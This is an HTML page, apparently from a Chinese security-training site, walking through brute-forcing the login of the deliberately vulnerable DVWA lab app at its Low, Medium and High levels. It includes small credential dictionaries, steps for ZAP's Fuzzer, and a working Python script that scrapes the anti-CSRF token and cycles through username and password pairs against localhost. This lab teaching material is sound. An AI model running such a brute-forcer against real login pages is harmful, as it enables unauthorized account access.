@@ -1,0 +1,654 @@
+
+
+
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="drkless docs">
+      
+      
+        <link rel="canonical" href="https://darkless.cn/my-docs/DVWA暴力破解/">
+      
+      
+        <meta name="author" content="hand">
+      
+      
+        <meta name="lang:clipboard.copy" content="复制">
+      
+        <meta name="lang:clipboard.copied" content="已复制">
+      
+        <meta name="lang:search.language" content="ja">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
+      
+        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
+      
+        <meta name="lang:search.result.other" content="# 个符合条件的结果">
+      
+        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
+      
+      <link rel="shortcut icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.1.2">
+    
+    
+      
+        <title>暴力破解 - DarkLess</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/application.3020aac5.css">
+      
+        <link rel="stylesheet" href="../assets/stylesheets/application-palette.224b79ff.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="">
+      
+    
+    
+      <script src="../assets/javascripts/modernizr.01ccdecf.js"></script>
+    
+    
+      
+    
+    <link rel="stylesheet" href="../assets/fonts/material-icons.css">
+    
+    
+    
+      
+        
+<script>
+  window.ga = window.ga || function() {
+    (ga.q = ga.q || []).push(arguments)
+  }
+  ga.l = +new Date
+  /* Setup integration and send page view */
+  ga("create", "None", "auto")
+  ga("set", "anonymizeIp", true)
+  ga("send", "pageview")
+  /* Register handler to log search on blur */
+  document.addEventListener("DOMContentLoaded", () => {
+    if (document.forms.search) {
+      var query = document.forms.search.query
+      query.addEventListener("blur", function() {
+        if (this.value) {
+          var path = document.location.pathname;
+          ga("send", "pageview", path + "?q=" + this.value)
+        }
+      })
+    }
+  })
+</script>
+<script async src="https://www.google-analytics.com/analytics.js"></script>
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="deep-orange">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#_1" tabindex="1" class="md-skip">
+        跳转至
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="https://darkless.cn/my-docs/" title="DarkLess" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon">book</i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              DarkLess
+            </span>
+            <span class="md-header-nav__topic">
+              暴力破解
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            键入以开始搜索
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="./" title="DVWA解题" class="md-tabs__link md-tabs__link--active">
+          DVWA解题
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="https://darkless.cn/my-docs/" title="DarkLess" class="md-nav__button md-logo">
+      
+        <i class="md-icon">book</i>
+      
+    </a>
+    DarkLess
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1" checked>
+    
+    <label class="md-nav__link" for="nav-1">
+      DVWA解题
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        DVWA解题
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        暴力破解
+      </label>
+    
+    <a href="./" title="暴力破解" class="md-nav__link md-nav__link--active">
+      暴力破解
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="字典" class="md-nav__link">
+    字典
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#low" title="LOW等级暴力破解" class="md-nav__link">
+    LOW等级暴力破解
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="设置浏览器代理" class="md-nav__link">
+    设置浏览器代理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="捕捉并分析请求" class="md-nav__link">
+    捕捉并分析请求
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" title="分析服务器返回的数据" class="md-nav__link">
+    分析服务器返回的数据
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#medium" title="Medium等级暴力破解" class="md-nav__link">
+    Medium等级暴力破解
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hight" title="Hight等级暴力破解" class="md-nav__link">
+    Hight等级暴力破解
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="字典" class="md-nav__link">
+    字典
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#low" title="LOW等级暴力破解" class="md-nav__link">
+    LOW等级暴力破解
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="设置浏览器代理" class="md-nav__link">
+    设置浏览器代理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="捕捉并分析请求" class="md-nav__link">
+    捕捉并分析请求
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" title="分析服务器返回的数据" class="md-nav__link">
+    分析服务器返回的数据
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#medium" title="Medium等级暴力破解" class="md-nav__link">
+    Medium等级暴力破解
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hight" title="Hight等级暴力破解" class="md-nav__link">
+    Hight等级暴力破解
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                  <h1>暴力破解</h1>
+                
+                <p>暴力破解通常是用手工或者工具的方法对一个网站的登陆页面不断尝试各种用户名和密码的组合，直到能试出正确的一个组合。</p>
+<p>DVWA的暴力破解难度等级分为四个 ：</p>
+<ul>
+<li>LOW：这一等级并没有对暴力破解做任何的防护，只需不断尝试即可破解。</li>
+<li>Medium: 这一等级是在LOW的基础上做了一点防护，当用户名和密码输错后会让用户在两秒后才能进行下一步的尝试。</li>
+<li>High:这一等级相比前两个等级有了较大的难度，在每次登陆时会带一个token字段发送到服务器端，服务器端会验证用户名，密码和token是否正确，正确才能登陆。token字段是随机生成的，当不了解使用何种算法生成token时是不能进行暴力破解的。</li>
+<li>Impossible: 这一等级DVWA在连续三次输错用户名和密码后会锁定15分钟，15分钟后才能尝试。这样的设定就无法进行暴力破解了。</li>
+</ul>
+<h2 id="_1">字典<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p><strong>暴力破解需要一本好的字典，字典越有针对性，破解过程越快。</strong>
+这里我们只是为了演示，就随便做了一个用户名的字典，一个密码的字典，字典内容如下：</p>
+<p>用户名字典：</p>
+<div class="codehilite"><pre><span></span>admin
+user
+admin123
+root
+root123
+administrator
+</pre></div>
+
+<p>密码字典：</p>
+<div class="codehilite"><pre><span></span>123456
+root
+admin123
+password
+qwerty
+abcd1234
+</pre></div>
+
+<h2 id="low">LOW等级暴力破解<a class="headerlink" href="#low" title="Permanent link">&para;</a></h2>
+<p>low等级的暴力破解比较简单，可以使用手工的方法在登陆页面不断进行尝试，但是这种方法用时会很长，这里我用用到了一款工具ZAP。</p>
+<blockquote>
+<p>OWASP Zed攻击代理（ZAP）是世界上最受欢迎的免费安全审计工具之一，由数百名国际志愿者积极维护。它可以帮助你在开发和测试应用程序时自动查找Web应用程序中的安全漏洞。
+也可以说ZAP是一个中间人代理。它能够获取你对Web应用程序发出的所有请求以及你从中收到的所有响应。</p>
+</blockquote>
+<p>ZAP的安装过程省略，提供一个ZAP的下载地址：<a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project</a></p>
+<h3 id="_2">设置浏览器代理<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<p>将其设置为ZAP所监听的端口，我设置的ZAP的端口为6666（默认端口为8080）。
+所以需要设置浏览器的代理为：127.0.0.1:6666</p>
+<p>浏览器端的设置代理的工具有很多，我用的是火狐浏览器，所用代理工具为“simpleProxy”。</p>
+<p><img alt="20190421213421.png" src="https://raw.githubusercontent.com/handbye/images/master/20190421213421.png" /></p>
+<p>设置好代理后，浏览器端的所有请求和响应都会被ZAP所捕捉到。</p>
+<h3 id="_3">捕捉并分析请求<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>在DVWA上随便输入一个用户名和密码，点击登陆，然后在ZAP上查看捕捉到的数据包。</p>
+<p><img alt="20190421215720.png" src="https://raw.githubusercontent.com/handbye/images/master/20190421215720.png" /></p>
+<p>分析捕获到的请求数据报头，发现报头中会携带用户名和密码发送到服务器端，然后服务器端判断是否正确。此时我们就可以在ZAP上不断修改用户名和密码发送到服务器端，然后根据响应结果判断用户名密码是否正确。
+ZAP提供的Fuzzer功能可以按照我们提供的字典修改请求头中的参数重复发送到服务器端。</p>
+<p><img alt="20190421220715.png" src="https://raw.githubusercontent.com/handbye/images/master/20190421220715.png" /></p>
+<p>参数设置好后就可以开始爆破了。</p>
+<p><img alt="20190421221327.png" src="https://raw.githubusercontent.com/handbye/images/master/20190421221327.png" /></p>
+<h3 id="_4">分析服务器返回的数据<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p><img alt="20190421222034.png" src="https://raw.githubusercontent.com/handbye/images/master/20190421222034.png" /></p>
+<p>分析数据包发现有一个数据返回的Body大小和其它的都不一样，于是怀疑这条数据是登陆成功后返回的，其它的都是登陆失败后返回的。毕竟正确的用户名和密码只有一个。
+于是将此用户名和密码输入到DVWA上发现登陆成功。</p>
+<p><img alt="20190421223450.png" src="https://raw.githubusercontent.com/handbye/images/master/20190421223450.png" /></p>
+<h2 id="medium">Medium等级暴力破解<a class="headerlink" href="#medium" title="Permanent link">&para;</a></h2>
+<p>Medium等级的暴力破解和LOW等级的暴力破解方法相同，只不过破解时间会变慢。在DVWA上查看源代码发现，每当输入错误的密码后，就会等待0-3秒才能进行下一次登陆。</p>
+<div class="codehilite"><pre><span></span><span class="x">if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {</span>
+<span class="x">        // Get users details</span>
+<span class="x">        $row    = mysqli_fetch_assoc( $result );</span>
+<span class="x">        $avatar = $row[&quot;avatar&quot;];</span>
+
+<span class="x">        // Login successful</span>
+<span class="x">        echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;</span>
+<span class="x">        echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;;</span>
+<span class="x">    }</span>
+<span class="x">    else {</span>
+<span class="x">        // Login failed</span>
+<span class="x">        sleep( rand( 0, 3 ) );</span>
+<span class="x">        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</span>
+<span class="x">    } ;</span>
+</pre></div>
+
+<p>此种方法只会延长暴力破解的时间，并不能阻止暴力破解。</p>
+<h2 id="hight">Hight等级暴力破解<a class="headerlink" href="#hight" title="Permanent link">&para;</a></h2>
+<p>和LOW等级一样，我们抓取Hight等级的请求数据包进行观察。</p>
+<p><img alt="20190422000439.png" src="https://raw.githubusercontent.com/handbye/images/master/20190422000439.png" /></p>
+<p>发现这个请求头比LOW等级的多了一个user_token参数，而且每次请求的user_token参数都是不同的。</p>
+<p>我们必须找出这个user_token的值是从哪里来的，规律是什么才能进行下一步的暴力破解。
+通过观察，我们发现在前端的HTML代码中，登陆框的form表单中有一个隐藏的input。</p>
+<p><img alt="20190422001159.png" src="https://raw.githubusercontent.com/handbye/images/master/20190422001159.png" /></p>
+<p>发现每次请求都会带上其中的value值进行发送，不断刷新网页，又发现这个value值是不断变化的。在不知道源码的情况下是无法推算出此value值的计算方法的。</p>
+<p>这里我写一段python代码来进行破解，思路大概是每次登陆前先获取HTNL代码中的value值然后放入header头中去请求服务器，直到成功为止。也可以使用burpsuit进行破解，过程请参考：
+<a href="https://blog.csdn.net/liweibin812/article/details/86287645">https://blog.csdn.net/liweibin812/article/details/86287645</a></p>
+<p>代码如下：</p>
+<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="c1">#DVWA High等级暴力破解</span>
+
+<span class="c1">#获取user_token值</span>
+<span class="n">header</span><span class="o">=</span><span class="p">{</span>
+    <span class="s1">&#39;Host&#39;</span><span class="p">:</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="s1">&#39;http://127.0.0.1/dvwa/vulnerabilities/brute/&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;Connection&#39;</span><span class="p">:</span> <span class="s1">&#39;keep-alive&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;Cookie&#39;</span><span class="p">:</span> <span class="s1">&#39;security=high; PHPSESSID=mtsel2kcb1a4uecf6b7e87aa23&#39;</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">get_user_token</span><span class="p">():</span>
+    <span class="c1"># 获取DVWA登陆页面</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1/dvwa/vulnerabilities/brute/&#39;</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">)</span>
+    <span class="n">rsp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
+
+    <span class="c1"># 获取登陆表单中的value值</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">rsp</span><span class="p">,</span><span class="s1">&#39;lxml&#39;</span><span class="p">)</span>
+    <span class="n">input_name</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">attrs</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span><span class="s1">&#39;user_token&#39;</span><span class="p">})</span>
+    <span class="n">value</span> <span class="o">=</span> <span class="n">input_name</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span>
+    <span class="k">return</span>  <span class="n">value</span>
+
+
+<span class="c1">#读取用户名和密码字典</span>
+<span class="n">f1</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;username.txt&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span>
+<span class="n">user_list</span> <span class="o">=</span> <span class="n">f1</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">user_list</span><span class="p">)):</span>
+    <span class="n">user_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">f1</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="n">f2</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;password.txt&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span>
+<span class="n">pass_list</span> <span class="o">=</span> <span class="n">f2</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">pass_list</span><span class="p">)):</span>
+    <span class="n">pass_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">pass_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">f2</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="c1"># value值即get请求头中的user_token</span>
+<span class="c1"># 开始组合请求头并发送到服务器</span>
+<span class="k">for</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">user_list</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">pass_list</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s1">&#39;password&#39;</span><span class="p">:</span><span class="n">password</span><span class="p">,</span><span class="s1">&#39;Login&#39;</span><span class="p">:</span><span class="s1">&#39;Login&#39;</span><span class="p">,</span><span class="s1">&#39;user_token&#39;</span><span class="p">:</span><span class="n">get_user_token</span><span class="p">()}</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1/dvwa/vulnerabilities/brute/&#39;</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span><span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+        <span class="n">rsp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
+        <span class="c1">#判断是否登陆成功</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">rsp</span><span class="p">,</span><span class="s1">&#39;lxml&#39;</span><span class="p">)</span>
+            <span class="n">error_text</span><span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">soup</span><span class="o">.</span><span class="n">pre</span><span class="o">.</span><span class="n">br</span><span class="o">.</span><span class="n">string</span><span class="p">)</span>
+            <span class="n">error_text</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">error_text</span><span class="p">)</span>
+            <span class="k">if</span> <span class="s1">&#39;incorrect&#39;</span> <span class="ow">in</span> <span class="n">error_text</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="o">+</span><span class="s1">&#39;  &#39;</span><span class="o">+</span><span class="s1">&#39;错误&#39;</span><span class="p">)</span>
+        <span class="k">except</span> <span class="ne">AttributeError</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="o">+</span><span class="s1">&#39;  &#39;</span><span class="o">+</span><span class="s1">&#39;正确&#39;</span><span class="p">)</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span> <span class="c1">#找到正确密码就退出程序，不在往下执行</span>
+</pre></div>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy;2019 darkless
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+  <div class="md-footer-social">
+    <link rel="stylesheet" href="../assets/fonts/font-awesome.css">
+    
+      <a href="http://darkless.cn" class="md-footer-social__link fa fa-globe"></a>
+    
+      <a href="https://github.com/handbye" class="md-footer-social__link fa fa-github-alt"></a>
+    
+      <a href="https://weibo.com/handbye" class="md-footer-social__link fa fa-weibo"></a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../assets/javascripts/application.267712eb.js"></script>
+      
+        
+        
+          
+          <script src="../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+                <script src="../assets/javascripts/lunr/tinyseg.js"></script>
+              
+              
+                <script src="../assets/javascripts/lunr/lunr.ja.js"></script>
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"1.0.4",url:{base:".."}})</script>
+      
+    
+  </body>
+</html>
